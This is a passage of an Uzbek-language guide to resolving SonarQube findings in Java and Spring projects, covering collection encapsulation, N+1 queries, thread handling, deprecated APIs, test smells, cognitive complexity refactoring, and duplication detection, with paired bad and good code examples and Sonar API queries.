// Yomon: ichki to'plam tashqariga chiqadi, null qaytarish ham issue
public class Order {
    private final List<Line> lines = new ArrayList<>();
    private BigDecimal total = BigDecimal.ZERO;

    public List<Line> getLines() { return lines; }        // tashqi kod add qila oladi
    public List<Discount> getDiscounts() { return null; } // chaqiruvchi tekshirishga majbur
}

// Yaxshi: faqat o'qiladigan ko'rinish, bo'sh to'plam, nazorat qilinadigan qo'shish
public class Order {
    private final List<Line> lines = new ArrayList<>();
    private final List<Discount> discounts = new ArrayList<>();
    private BigDecimal total = BigDecimal.ZERO;

    public List<Line> getLines() { return List.copyOf(lines); }
    public List<Discount> getDiscounts() { return List.copyOf(discounts); }

    public void addLine(Line line) {
        lines.add(line);
        total = total.add(line.amount());                 // invariant saqlanadi
    }
}
```

### 14.8 Strim va sikl ichida og'ir operatsiya

Sikl ichida baza so'rovi yoki tashqi chaqiruv turishi Sonar da bitta qoida bilan emas, bir necha signal bilan ko'rinadi. Satrni `+` bilan sikl ichida yig'ish uchun aniq qoida bor, kaliti `java:S1643`. Strim ichida `peek` orqali yon ta'sir qilish uchun ham qoida bor, kaliti `java:S3864`. N+1 so'rov esa ko'pincha statik tahlilga ko'rinmaydi, shuning uchun uni review va test bilan tutish kerak. Amaliy qoida ikkita. Birinchi: sikldan oldin bir marta so'rab `Map` ga yig'ib qo'yish. Ikkinchi: strimni baza bilan muloqot uchun ishlatmaslik.

```java
// Yomon: sikl ichida so'rov va satr konkatenatsiyasi
public String report(List<String> skus) {
    String out = "";
    for (String sku : skus) {
        Stock stock = stockRepo.findBySku(sku);   // har iteratsiyada bitta so'rov
        out += sku + ":" + stock.getQty() + "\n"; // har iteratsiyada yangi String
    }
    return out;
}

// Yaxshi: bitta so'rov, StringBuilder yoki joining
public String report(List<String> skus) {
    Map<String, Integer> qtyBySku = stockRepo.findAllBySkuIn(skus).stream()
            .collect(Collectors.toMap(Stock::getSku, Stock::getQty));

    return skus.stream()
            .map(sku -> sku + ":" + qtyBySku.getOrDefault(sku, 0))
            .collect(Collectors.joining("\n", "", "\n"));
}
```

### 14.9 Thread va `ExecutorService` bilan bog'liq ogohlantirishlar

Bu sohada Sonar ning eng qat'iy qoidalari bor, chunki xato natijasi kutilmagan bo'ladi. `Thread.run()` ni to'g'ridan-to'g'ri chaqirish yangi thread ochmaydi va buning uchun alohida qoida bor, kaliti `java:S1217`. `InterruptedException` ni yutib yuborish ham bug sifatida belgilanadi, kaliti `java:S2142`: interrupt signali yo'qoladi va thread to'xtamaydi. Yopilmagan `ExecutorService` esa thread leak beradi, ayniqsa har so'rovda yangi pool yaratilsa. Java 21 dan `ExecutorService` `AutoCloseable` ni amalga oshiradi, shuning uchun try-with-resources ishlaydi. Undan oldingi versiyada `shutdown` ni `finally` blokida chaqirish kerak.

```java
// Yomon: run() yangi thread ochmaydi, pool yopilmaydi, interrupt yutiladi
public void notifyAll(List<String> emails) {
    ExecutorService pool = Executors.newFixedThreadPool(8);  // hech qachon yopilmaydi
    for (String email : emails) {
        new Thread(() -> mailer.send(email)).run();           // oddiy metod chaqiruvi
    }
    try {
        pool.awaitTermination(5, TimeUnit.SECONDS);
    } catch (InterruptedException e) {
        // signal yutilib ketdi
    }
}

// Yaxshi: pool spring bean, interrupt qayta tiklanadi
public void notifyAll(List<String> emails) {
    List<CompletableFuture<Void>> tasks = emails.stream()
            .map(email -> CompletableFuture.runAsync(() -> mailer.send(email), pool))
            .toList();
    try {
        CompletableFuture.allOf(tasks.toArray(CompletableFuture[]::new))
                .get(5, TimeUnit.SECONDS);
    } catch (InterruptedException e) {
        Thread.currentThread().interrupt();                   // signal tiklanadi
        throw new NotificationException("to'xtatildi", e);
    } catch (ExecutionException | TimeoutException e) {
        throw new NotificationException("yuborilmadi", e);
    }
}
```

### 14.10 Eskirgan (deprecated) API ishlatish va migratsiya

Eskirgan API chaqirilganda Sonar `java:S1874` ni ochadi. Bu ogohlantirishni e'tiborsiz qoldirishning narxi keyinroq to'lanadi: `forRemoval = true` belgisi bilan kelgan API keyingi major versiyada yo'qoladi va yangilash to'xtab qoladi. Spring Boot 3.x ga o'tishda bu aniq ko'rindi: `WebSecurityConfigurerAdapter` Spring Security 6 da olib tashlandi va uning o'rniga `SecurityFilterChain` bean i keldi. Shuning uchun deprecated issue larni texnik qarz emas, balki muddat belgilangan vazifa deb ko'rish kerak. O'zingiz API eskirtirsangiz, `@Deprecated(since, forRemoval)` va Javadoc dagi `@deprecated` izohida almashtiruvchini aniq ko'rsating. Shunda chaqiruvchi nimaga o'tishini qidirib yurmaydi.

```java
// Yomon: eskirgan metodni chaqirish, almashtiruvchi ko'rsatilmagan
@Deprecated
public BigDecimal calc(Order o) { return o.getTotal(); }

public void send(Order o) {
    BigDecimal sum = calc(o);          // java:S1874, qachon yo'qolishi noma'lum
    gateway.charge(sum);
}

// Yaxshi: muddat va almashtiruvchi aniq, chaqiruv yangi API ga o'tgan
/**
 * @deprecated 2.4 dan beri. {@link #amountToCharge(Order)} dan foydalaning.
 */
@Deprecated(since = "2.4", forRemoval = true)
public BigDecimal calc(Order o) { return amountToCharge(o); }

public Money amountToCharge(Order o) {
    return Money.of(o.total(), o.currency());
}

public void send(Order o) {
    gateway.charge(amountToCharge(o));  // yangi API, issue yo'q
}
```

### 14.11 Test kodidagi tez-tez uchraydigan issue lar

Sonar test kodini ham tahlil qiladi, lekin boshqa qoidalar to'plami bilan. Assertion siz test uchun qoida bor, kaliti `java:S2699`: metod `@Test` bilan belgilangan, lekin hech narsa tekshirmaydi. Bunday test coverage ni oshiradi va hech qanday xatoni tutmaydi, bu esa 100% coverage raqamining eng ko'p uchraydigan aldovi. Test metodlari bo'lmagan test klass uchun `java:S2187` ishlaydi. Testda `Thread.sleep` ishlatish uchun `java:S2925` ishlaydi, chunki bu flaky test manbai. O'chirilgan testlar ham alohida belgilanadi, chunki ular yashirin ravishda abadiy o'chib qoladi. Mok emas, natijani tekshirish odatini saqlang. Test infratuzilmasi haqida batafsil ma'lumot testlash qo'llanmasida.

```java
// Yomon: assertion yo'q, sleep bor, faqat mok tekshirilgan
@Test
void placeOrder() {
    orderService.place(new CreateOrderRequest("SKU-1", 2));   // hech narsa tekshirilmadi
}

@Test
void asyncNotify() throws Exception {
    notifier.notifyAll(List.of("a@b.uz"));
    Thread.sleep(2000);                                       // java:S2925, flaky
    verify(mailer).send("a@b.uz");                            // natija tekshirilmaydi
}
// Yaxshi: natija tekshirilgan, kutish deterministik
@Test
void placeOrderReservesStockAndReturnsId() {
    OrderResponse res = orderService.place(new CreateOrderRequest("SKU-1", 2));

    assertThat(res.id()).isPositive();
    assertThat(stockRepo.findBySku("SKU-1").getQty()).isEqualTo(8);
}

@Test
void asyncNotifySendsOnce() {
    notifier.notifyAll(List.of("a@b.uz"));

    await().atMost(Duration.ofSeconds(2))                     // shart bo'yicha kutish
           .untilAsserted(() -> verify(mailer).send("a@b.uz"));
}
```

### 14.12 Issue larni toifa bo'yicha tartiblash va birinchi nimani tuzatish

Mingta issue bilan ishlashning birinchi qadami ro'yxatni tartiblash. Eski Sonar taksonomiyasida issue lar Bug, Vulnerability, Code Smell va Security Hotspot ga bo'linadi. Yangi liniyada esa software quality (Security, Reliability, Maintainability) va severity (Blocker, High, Medium, Low, Info) ishlatiladi. Qaysi ko'rinish chiqishi versiya va sozlamaga qarab farq qiladi, lekin tartiblash mantiqi bir xil qoladi. Birinchi navbat har doim xavfsizlik va ishonchlilik: ma'lumot oqib ketishi yoki noto'g'ri hisob natijasi bevosita zarar keltiradi. Ikkinchi navbat yangi kod dagi issue lar, chunki quality gate aynan shuni tekshiradi. Uchinchi navbat eski koddagi maintainability, u faqat tegilgan fayllarda tuzatiladi.

| Mezon | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Boshlash nuqtasi | Ro'yxatni tepadan pastga tuzatish | Security va Reliability ni birinchi navbatga qo'yish |
| Eski kod | Hammasini bir sprintda tozalashga urinish | Clean as You Code: faqat tegilgan kodni tozalash |
| Field injection | `@Autowired` qoldirib qoidani o'chirish | Konstruktor injection ni loyiha standarti qilish |
| Katta metod | Metodni ikkiga bo'lib chegaradan o'tish | Mas'uliyatni servisga ko'chirish va test bilan yopish |
| SQL issue | `NOSONAR` yoki false positive deb yopish | Parametr va whitelist enum bilan taint zanjirini uzish |
| `@Transactional` | Annotatsiyani ko'proq joyga qo'yish | Tranzaksiya chegarasini bitta qatlamda belgilash |
| Coverage | Raqamni assertion siz test bilan ko'tarish | Assertion sifatini va mutation natijasini kuzatish |
| Deprecated API | Ogohlantirishni e'tiborsiz qoldirish | Muddat belgilangan migratsiya vazifasi ochish |
| Qoidani o'chirish | Shovqin ko'rinsa profildan olib tashlash | Sababni yozib, quality profile ni versiyalab o'zgartirish |

| Tuzoq | Nima bo'ladi | Yechim |
|---|---|---|
| `@Transactional` self-invocation | Tranzaksiya umuman ochilmaydi | Chegarani tashqi ommaviy metodga ko'chirish |
| `private` metodda `@Transactional` | Proxy e'tiborsiz qoldiradi | Metodni ommaviy qilish yoki alohida bean ga chiqarish |
| Ichki `List` ni qaytarish | Tashqi kod invariantni buzadi | `List.copyOf` yoki immutable ko'rinish qaytarish |
| `null` to'plam qaytarish | Har bir chaqiruvchida tekshiruv | Bo'sh to'plam qaytarish |
| Sikl ichida repository chaqiruvi | N+1 so'rov, sekin javob | `findAllBy...In` bilan bitta so'rov va `Map` |
| Yutilgan `InterruptedException` | Thread to'xtamaydi, shutdown osiladi | `Thread.currentThread().interrupt()` chaqirish |
| Yopilmagan `ExecutorService` | Thread leak va xotira o'sishi | Pool ni bean qilish yoki try-with-resources |
| `static SimpleDateFormat` | Parallel ishlatganda noto'g'ri sana | `DateTimeFormatter` va `java.time` |
| Assertion siz test | Coverage yuqori, xato tutilmaydi | Natijani tekshiradigan assertion qo'shish |
| `@RequestBody` da `@Valid` yo'q | Validatsiya annotatsiyalari ishlamaydi | `@Valid` qo'shish va 400 javobni test qilish |

### 14.13 Amalda qo'llash

- [ ] Loyihada `@Autowired` qo'yilgan maydonlarni grep bilan toping va hammasini konstruktor injection ga o'tkazing, maydonlarni `final` qiling.
- [ ] Cognitive complexity chegarasidan oshgan metodlar ro'yxatini Sonar dan oling va eng yuqori uchtasini servis metodlariga bo'ling.
- [ ] Barcha `@RequestBody` va `@ModelAttribute` parametrlarini tekshirib, `@Valid` yo'qlarini qo'shing va noto'g'ri kiritma uchun 400 javobni test bilan yoping.
- [ ] Satr konkatenatsiyasi bilan yig'ilgan SQL larni parametrlangan so'rovga o'tkazing, tartiblash ustunlarini enum whitelist bilan cheklang.
- [ ] `@Transactional` annotatsiyalarini audit qiling: `private`, `final` va self-invocation holatlarini topib chegarani ommaviy servis metodiga ko'chiring.
- [ ] `java.util.Date`, `Calendar` va `SimpleDateFormat` ishlatgan joylarni `java.time` ga ko'chiring, vaqt olishni `Clock` bean i orqali qiling.
- [ ] Getter lar ichida ichki to'plam qaytaradigan joylarni `List.copyOf` ga almashtiring va `null` qaytaradiganlarni bo'sh to'plamga o'zgartiring.
- [ ] Test paketida assertion siz testlarni va `Thread.sleep` ishlatgan testlarni toping, birinchisiga assertion qo'shing, ikkinchisini shart bo'yicha kutishga o'tkazing.

## 15. Cognitive complexity va takrorlanishni kamaytirish (Cognitive Complexity and Duplication)

Cognitive complexity va takrorlanish Sonar hisobotida eng ko'p uchraydigan ikki muammo. Ikkisi ham quality gate ni Maintainability tomonidan to'xtatadi, lekin sababi boshqa: biri bitta metod ichidagi fikr yuki, ikkinchisi kod bazasidagi nusxalar. Quyida Sonar ularni qanday hisoblashini ko'rib chiqamiz, keyin bir uzun metodni bosqichma-bosqich chegaradan pastga tushiramiz. Maqsad raqamni yashirish emas, o'qilishi oson kod yozish.

### 15.1 Cognitive complexity qanday hisoblanadi: ortish va chuqurlik jarimasi

Cognitive complexity ni Sonar `java:S3776` qoidasi bilan tekshiradi, metod uchun standart chegara 15. Hisob uch qoidadan iborat.

Birinchi qoida: chiziqli oqimni buzgan har bir konstruksiya uchun +1 qo'shiladi. Bunga `if`, `else if`, `else`, uchlik operator, `switch`, `for`, `while`, `do while`, `catch`, belgiga `break` yoki `continue`, va rekursiya kiradi.

Ikkinchi qoida: ichma-ich joylashish jarimasi. Agar konstruksiya boshqa konstruksiya ichida bo'lsa, u +1 emas, +(1 + chuqurlik) oladi. Ya'ni ikkinchi qavatdagi `if` +2, uchinchi qavatdagi `if` +3 beradi. Jarima `if`, uchlik operator, `switch`, sikllar va `catch` ga tegishli.

Uchinchi qoida: ba'zi narsalar jarimadan ozod. `else` va `else if` faqat +1 oladi, chuqurlik jarimasi yo'q, chunki o'quvchi uchun ular bir xil darajadagi tanlov. `switch` butun bloki uchun +1, `case` lar soni ahamiyatsiz. Mantiqiy operatorlar ketma-ketligi uchun esa har bir operator emas, har bir ketma-ketlik +1 oladi: `a && b && c` bitta ball, `a && b || c` esa ikkita, chunki operator turi o'zgardi.

Natijada bir xil shart sonida ball juda farq qiladi. Tekis o'nta `if` 10 ball, ichma-ich beshta `if` esa 1+2+3+4+5 = 15 ball. Sonar aynan chuqurlikni jazolaydi, chunki u o'quvchidan har qavatda kontekstni yodda saqlashni talab qiladi.

### 15.2 Cyclomatic complexity bilan farqi va nega Sonar ikkinchisini afzal ko'radi

Cyclomatic complexity (McCabe) qarorlar nuqtasini sanaydi va test yo'llari sonini baholaydi. Sonar da u hozir ham `complexity` metrikasi sifatida hisoblanadi, lekin metod chegarasi qoidasi yangi Java analyzer liniyalarida ikkinchi planda qoldi. Sababi: u bir qancha holatda o'qilishni to'g'ri aks ettirmaydi.

| Holat | Cyclomatic | Cognitive | Haqiqatda o'qilishi |
|---|---|---|---|
| 10 case li tekis `switch` | 10 ga yaqin | 1 | Oson, jadvalga o'xshaydi |
| 5 qavat ichma-ich `if` | 5 ga yaqin | 15 | Juda qiyin |
| `getter` lar bilan uzun klass | Har metodda 1 | Har metodda 0 | Oson |
| `a && b && c && d` | 4 ga yaqin | 1 | Bitta fikr, oson |
| 3 qavatli sikl ichida `try/catch` | 4 ga yaqin | 10 dan ortiq | Qiyin |

`switch` cyclomatic bo'yicha jazolanadi, cognitive bo'yicha deyarli bepul. Bu to'g'ri, chunki 20 ta valyuta kodini o'girgan `switch` bir qarashda tushuniladi. Teskarisi, uch qavat sikl ichidagi shart cyclomatic bo'yicha arzon, odam uchun esa og'ir.

Amaliy xulosa: cyclomatic complexity ni test qoplamini rejalashtirishda ishlat, cognitive complexity ni refactoring navbatini tuzishda ishlat.

### 15.3 Chegaradan oshgan metodni bo'lish usullari

Mana haqiqiy chegirma hisoblash metodi. Sonar unga `java:S3776` qo'yadi, ball 24 ga chiqadi, ustiga `java:S134` (haddan ortiq ichma-ich joylashish) ham tushadi.

```java
// YOMON: cognitive complexity 24, chegara 15
public BigDecimal chegirma(Buyurtma b) {
    BigDecimal natija = BigDecimal.ZERO;
    if (b != null) {                                         // +1
        if (b.getMijoz() != null) {                          // +2
            if (b.getMijoz().getDaraja() == Daraja.GOLD) {   // +3
                if (b.getSumma().compareTo(LIMIT) > 0) {     // +4
                    natija = foiz(b, "0.15");
                } else {                                     // +1
                    natija = foiz(b, "0.10");
                }
            } else if (b.getMijoz().getDaraja() == Daraja.SILVER) { // +1
                if (b.getSumma().compareTo(LIMIT) > 0) {     // +4
                    natija = foiz(b, "0.08");
                } else {                                     // +1
                    natija = foiz(b, "0.05");
                }
            }
            for (Qator q : b.getQatorlar()) {                // +2
                if (q.aksiyada() && q.getSoni() > 10) {      // +3, && uchun +1
                    natija = natija.add(q.getNarx());
                }
            }
        }
    }
    return natija;
}
```

Birinchi qadam eng arzon: aksiya bonusi chegirma foizidan mustaqil, uni alohida metodga chiqaramiz.

```java
// 1-qadam: aksiya bonusini ajratdik. Yangi metod ball 3, asosiy metod 7 ball yengildi.
private BigDecimal aksiyaBonusi(List<Qator> qatorlar) {
    return qatorlar.stream()                                  // +0
            .filter(q -> q.aksiyada() && q.getSoni() > 10)     // +1 (lambda ichida && )
            .map(Qator::getNarx)
            .reduce(BigDecimal.ZERO, BigDecimal::add);
}
```

Metodni bo'lish ballni yashirish emas, chunki Sonar har metodni alohida o'lchaydi va chegara ham metod darajasida. Lekin suiiste'mol qilsa, 20 ta ma'nosiz `private` metod paydo bo'ladi. Mezon bitta: ajratilgan bo'lakka to'g'ri nom berish mumkinmi? `aksiyaBonusi` yaxshi nom, `qism2` esa bo'linish noto'g'ri joydan o'tgani belgisi.

### 15.4 Shartlar daraxtini jadval yoki xaritaga aylantirish

Qolgan daraxt aslida jadval: daraja va summa chegarasi bo'yicha foiz. Uni kodda emas, ma'lumot sifatida saqlash mumkin.

```java
// 2-qadam: daraxt yo'qoldi, jadval paydo bo'ldi. Metod ball 1 ga tushdi.
private static final Map<Daraja, NavigableMap<BigDecimal, BigDecimal>> JADVAL =
        Map.of(
            Daraja.GOLD,   tariff("0", "0.10", "5000000", "0.15"),
            Daraja.SILVER, tariff("0", "0.05", "5000000", "0.08"),
            Daraja.BRONZE, tariff("0", "0.00")
        );

private BigDecimal foizTopish(Daraja daraja, BigDecimal summa) {
    NavigableMap<BigDecimal, BigDecimal> qator =
            JADVAL.getOrDefault(daraja, BOSH_JADVAL);
    // floorEntry summadan kichik yoki teng eng katta chegarani beradi
    Map.Entry<BigDecimal, BigDecimal> topilgan = qator.floorEntry(summa);
    return topilgan == null ? BigDecimal.ZERO : topilgan.getValue();  // +1
}
```

Agar foizlar tez o'zgarsa, jadvalni bazaga ko'chirish mantiqiy: kod o'zgarmaydi, faqat ma'lumot o'zgaradi.

```sql
-- Chegirma tarifi: kod emas, ma'lumot. Har o'zgarishda deploy kerak emas.
CREATE TABLE chegirma_tarifi (
    id            BIGSERIAL PRIMARY KEY,
    daraja        VARCHAR(16) NOT NULL,
    min_summa     NUMERIC(19, 2) NOT NULL,
    foiz          NUMERIC(5, 4) NOT NULL,
    amal_boshlanish DATE NOT NULL,
    CONSTRAINT uq_tarif UNIQUE (daraja, min_summa, amal_boshlanish)
);

-- Eng mos tarifni bitta so'rov bilan topish: shart kodda emas, indeksda
SELECT foiz
FROM chegirma_tarifi
WHERE daraja = :daraja
  AND min_summa <= :summa
  AND amal_boshlanish <= CURRENT_DATE
ORDER BY min_summa DESC, amal_boshlanish DESC
LIMIT 1;
```

Halol bo'lish kerak: jadvalga ko'chirish murakkablikni yo'q qilmaydi, uni koddan ma'lumot bazasiga ko'chiradi. Zarari shunda: xato tarif endi compile vaqtida ushlanmaydi, migratsiya va validatsiya kerak. Tarif haftada bir marta o'zgarsa almashtirish foydali, yilda bir marta o'zgarsa `enum` da qoldirish yaxshiroq.

### 15.5 Qo'riqchi shart (guard clause) bilan chuqurlikni kamaytirish

Endi eng katta jarima manbasi qoldi: ikki qavat `null` tekshiruvi. Ular butun metod tanasini ikki qavat ichkariga surgan va har bir ichki `if` ga +2 qo'shgan. Guard clause buni tekislaydi.

```java
// 3-qadam: yakuniy variant. Cognitive complexity 2, S134 ham yo'qoldi.
public BigDecimal chegirma(Buyurtma b) {
    if (b == null || b.getMijoz() == null) {       // +1, || ketma-ketligi uchun +1
        return BigDecimal.ZERO;                     // qo'riqchi: darhol chiqamiz
    }
    BigDecimal foiz = foizTopish(b.getMijoz().getDaraja(), b.getSumma());
    BigDecimal asosiy = b.getSumma().multiply(foiz);
    return asosiy.add(aksiyaBonusi(b.getQatorlar()));
}
```

24 dan 2 ga tushdi, mantiq esa o'zgarmadi. Uch qadam ishladi: mustaqil mas'uliyatni ajratish, shart daraxtini jadvalga aylantirish, qolgan tekshiruvni qo'riqchiga chiqarish.

Guard clause da bitta tuzoq bor. Sonar `java:S1142` qoidasi bir metodda `return` soni ko'p bo'lsa shikoyat qiladi, standart chegara 3. Shuning uchun guard larni cheksiz qo'shib bo'lmaydi. Agar beshta `null` tekshiruvi kerak bo'lsa, bu metod emas, ma'lumot modeli muammosi: `Optional`, `record` ichida majburiy maydon yoki `@NotNull` validatsiyasi bilan tekshiruvni chegaraga ko'chirish to'g'riroq.

### 15.6 Strategiya tanlovini `switch` dan ko'rsatkichga ko'chirish

Katta `switch` o'zi ball oshirmaydi, lekin `case` ichida mantiq bo'lsa, ichkaridagi `if` lar jarima olib ball tez o'sadi. Ustiga har yangi to'lov usuli bir xil faylni o'zgartirishga majbur qiladi.

```java
// YOMON: har case ichida mantiq bor, ball tez o'sadi va fayl doim o'zgaradi
public Natija tola(TolovTuri turi, Tolov t) {
    switch (turi) {                                  // +1
        case KARTA:
            if (t.getSumma().compareTo(KARTA_LIMIT) > 0) { // +2
                return Natija.rad("limit");
            }
            return kartaClient.yubor(t);
        case HISOB:
            if (!t.getHisob().faol()) { return Natija.rad("faol emas"); } // +2
            return hisobClient.yubor(t);
        default:
            throw new IllegalStateException("noma'lum tur");
    }
}
```

Yechim: har usulni o'z klassiga chiqarib, tanlovni xaritaga aylantirish. Spring da konteyner `List` ni o'zi to'ldiradi.

```java
// Sonar o'tadigan variant: tanlov 0 ball, yangi tur yangi klass bilan qo'shiladi
public interface TolovStrategiyasi {
    TolovTuri turi();
    Natija bajar(Tolov t);
}

@Service
public class TolovServisi {
    private final Map<TolovTuri, TolovStrategiyasi> xarita;

    // Spring barcha implementatsiyani o'zi topadi, qo'lda ro'yxat yozilmaydi
    public TolovServisi(List<TolovStrategiyasi> strategiyalar) {
        this.xarita = strategiyalar.stream()
            .collect(toMap(TolovStrategiyasi::turi, s -> s));
    }

    public Natija tola(TolovTuri turi, Tolov t) {
        TolovStrategiyasi s = xarita.get(turi);
        if (s == null) {                             // +1
            throw new NoqonuniyTolovTuri(turi);
        }
        return s.bajar(t);
    }
}
```

Dizayn tomoni pattern katalogidagi Strategy mavzusida batafsil. Sonar hisobi bu yerda shunday: `tola` metodi 1 ball, har strategiya alohida fayl va alohida kichik ball. Yon foyda, har strategiyani alohida test qilish oson, demak coverage ham ko'tariladi.

### 15.7 Takrorlanish qanday aniqlanadi: token ketma-ketligi va eng kichik blok

Sonar takrorlanishni CPD (copy paste detector) bilan topadi: kodni token ketma-ketligiga aylantirib, bir xil ketma-ketliklarni qidiradi. Identifikator nomlari hisobga olinadi, shuning uchun nomni almashtirish ba'zan blokni chegaradan pastga tushiradi.

Java chegarasi boshqa tillardan farq qiladi: blok takrorlanish sanalishi uchun kamida 10 ta ketma-ket va bir xil statement kerak, token soni hisobga olinmaydi. Ko'p boshqa tilda chegara token va qator soniga bog'liq. Amalda bu shuni bildiradi: 8 statement li nusxa Sonar da ko'rinmaydi, lekin yaxshi kod bo'lib qolmaydi.

Hisobotda uch metrika bor: `duplicated_lines_density` (foiz), `duplicated_blocks` va `duplicated_files`. Standart "Sonar way" gate da new code uchun duplikatsiya 3 foizdan kam bo'lishi talab qilinadi, eski kod shartga kirmaydi.

```properties
# sonar-project.properties: nima tahlil qilinadi va nima CPD dan chiqariladi
sonar.projectKey=ombor-servisi
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.binaries=target/classes

# Generatsiya qilingan kod: takrorlanish bor, lekin qo'l tegmaydi
sonar.cpd.exclusions=**/generated/**,**/*MapperImpl.java,**/dto/**

# Butun tahlildan chiqarish bu boshqa narsa, ehtiyot bo'l
sonar.exclusions=**/target/**,**/*Config.java.bak
```

`sonar.cpd.exclusions` faqat takrorlanish tekshiruvini o'chiradi, boshqa qoidalar ishlaydi. `sonar.exclusions` esa faylni butunlay tahlildan chiqaradi va coverage hisobiga tegadi. Ikkisini aralashtirish ko'p uchraydigan xato.

### 15.8 Yolg'on takrorlanish: o'xshash, lekin boshqa sababga xizmat qiladigan kod

CPD matnni ko'radi, maqsadni ko'rmaydi, shuning uchun ikki mustaqil qoidani takrorlanish deb belgilaydi. Misol: buyurtma validatsiyasi va qaytarish validatsiyasi bugun bir xil, ertaga ajralib ketadi. Ularni birlashtirsang, metodga `boolean qaytarishMi` parametri qo'shiladi, keyin ikkinchi flag. Natijada bitta chalkash metod, ikki tiniq metoddan yomonroq.

Qarorni ikki savol bilan qabul qil. Birinchi savol: bu ikki joy bir sabab bilan o'zgaradimi? Agar bitta biznes qoidasi o'zgarganda ikkisi ham o'zgarishi shart bo'lsa, bu haqiqiy takrorlanish. Ikkinchi savol: umumiy metodga nom topa olamanmi? Agar nom `umumiyIshlov` yoki `tekshirHammasi` bo'lib chiqsa, demak umumiy tushuncha yo'q.

Yolg'on takrorlanishni `sonar.cpd.exclusions` bilan emas, issue ni izoh bilan yopish orqali hal qil, chunki sabab o'sha joyda qoladi. Holat nomi versiyaga qarab farq qiladi: eski liniyada `Won't Fix`, yangi liniyada `Accepted`.

| Tuzoq | Nega yuzaga keladi | Yechim |
|---|---|---|
| Blok 9 statement, Sonar jim | Java chegarasi 10 statement | Chegaraga emas, sababga qara; nusxa bo'lsa birlashtir |
| Nom almashtirib duplikatsiyani yashirish | CPD identifikatorga sezgir | Bu texnik qarz, keyin ikki joyda bug tuzatiladi |
| `sonar.exclusions` bilan yopish | Coverage ham yo'qoladi | `sonar.cpd.exclusions` ishlat |
| Umumiy metodga flag parametri | Ikki sabab bitta metodga siqilgan | Ikki alohida metod qoldir |
| MapStruct `Impl` fayllari | Generatsiya qilingan nusxa | CPD dan chiqar, `target` ni source qilma |
| DTO va entity bir xil maydonlar | Tabiiy o'xshashlik | Birlashtirma, qatlam chegarasi muhimroq |
| Metodni mayda `private` larga maydalash | Ball tushadi, o'qilishi yomonlashadi | Faqat nom topilsa ajrat |
| Test da nusxa ko'rish | Testda nusxa ba'zan foydali | Pastdagi test bo'limiga qara |

### 15.9 Takrorlanishni umumiy metodga chiqarish va qachon chiqarmaslik

Haqiqiy takrorlanishda eng yaxshi yechim o'zgaruvchan qismni parametr qilish, qolganini o'zgarmas qoldirish. Omborda qoldiq tekshiruvi misoli.

```java
// YOMON: uchta joyda bir xil 11 statement, Sonar duplicated_blocks beradi
// (reservQil, bekorQil, inventarizatsiya metodlarida aynan shu blok bor)

// Sonar o'tadigan variant: bir xil qism bitta metodda, farq lambda da
private <T> T qoldiqBilanIshla(Long mahsulotId,
                               Function<Qoldiq, T> amal) {
    Qoldiq q = qoldiqRepo.findByMahsulotIdForUpdate(mahsulotId)
            .orElseThrow(() -> new QoldiqTopilmadi(mahsulotId));
    if (q.arxivlangan()) {                                  // +1
        throw new ArxivQoldiq(mahsulotId);
    }
    T natija = amal.apply(q);
    q.setOxirgiTegish(Instant.now());
    qoldiqRepo.save(q);
    return natija;
}

// Chaqiruv joyi qisqa va maqsadi tiniq
public void reservQil(Long mahsulotId, int soni) {
    qoldiqBilanIshla(mahsulotId, q -> {
        q.kamaytir(soni);
        return null;
    });
}
```

Chiqarmaslik kerak bo'lgan holatlar aniq. Ikki modul mustaqil deploy qilinsa, umumiy metod ular orasida keraksiz bog'liqlik yaratadi. Takrorlangan kod ikki xil qatlamda bo'lsa, masalan DTO va entity, o'xshashlik tabiiy. Umumiy metod uchta `boolean` parametr talab qilsa, u ikki maqsadni siqib turgan. Blok hali barqarorlashmagan yangi funksiya ichida bo'lsa, uchinchi nusxagacha kutish amalda yaxshi ishlaydi.

### 15.10 Test kodidagi takrorlanish: alohida munosabat talab qiladi

Sonar `sonar.tests` papkasini ham tahlil qiladi, lekin qoida to'plami boshqacha va duplikatsiya metrikasiga test kodi odatda qo'shilmaydi. Shunga qaramay testdagi nusxa real muammo, chunki o'qilishni buzadi.

Munosabat ishlab chiqarish kodidan yumshoqroq bo'lishi kerak. Test o'z holicha o'qilishi muhim: o'quvchi uchta fayl ochmasdan nima tekshirilayotganini tushunishi kerak. Shuning uchun `assert` larni "umumiy tekshiruv" metodiga yashirish ko'pincha zarar. Test ma'lumotini tayyorlash qismi boshqa gap, u takrorlanganda fixture ga chiqarish to'g'ri.

```java
// Test ma'lumotini tayyorlash: nusxa bu yerda zarar, builder yaxshi
public final class BuyurtmaFixture {
    public static Buyurtma.Builder oddiy() {
        return Buyurtma.builder()
                .mijoz(Mijoz.builder().daraja(Daraja.BRONZE).build())
                .summa(new BigDecimal("100000"))
                .qatorlar(List.of());
    }
    // Har test faqat o'zi uchun muhim maydonni o'zgartiradi
    // gold().summa(...).build() ko'rinishida chaqiriladi
    public static Buyurtma.Builder gold() {
        return oddiy().mijoz(Mijoz.builder().daraja(Daraja.GOLD).build());
    }
}
```

Parametrlangan test eng arzon usul, lekin uni faqat bir xil xatti harakat turli kirish bilan tekshirilganda ishlat. Har holat uchun boshqa `assert` kerak bo'lsa, u mos emas. Fixture ni tashkil qilishning to'liq ko'rinishi testlash qo'llanmasidagi test ma'lumotlari mavzusida.

### 15.11 Murakkablikni o'lchash va uni kamaytirishni rejaga qo'yish

Murakkablikni bir martalik aksiya bilan tuzatib bo'lmaydi. Birinchi qadam hozirgi holatni raqamda bilish, buni Sonar web API beradi.

```bash
# Loyiha bo'yicha umumiy ko'rsatkichlar
curl -sS -u "$SONAR_TOKEN:" \
  "$SONAR_HOST/api/measures/component?component=ombor-servisi\
&metricKeys=cognitive_complexity,complexity,duplicated_lines_density,duplicated_blocks"

# Eng og'ir 20 metodni topish: S3776 issue larini qoldiq bo'yicha saralash
curl -sS -u "$SONAR_TOKEN:" \
  "$SONAR_HOST/api/issues/search?componentKeys=ombor-servisi\
&rules=java:S3776&ps=20&s=FILE_LINE" | jq -r '.issues[] | "\(.component) \(.line) \(.message)"'
```

Keyingi qadam chegarani yangi kod uchun qattiq ushlash. Bu "clean as you code": eski 400 ta issue bugun tuzatilmaydi, lekin yangi kod toza bo'ladi.

```xml
<!-- pom.xml: sonar-maven-plugin versiyasini qotirib qo'y, aks holda CI beqaror -->
<plugin>
  <groupId>org.sonarsource.scanner.maven</groupId>
  <artifactId>sonar-maven-plugin</artifactId>
  <version>3.11.0.3922</version>
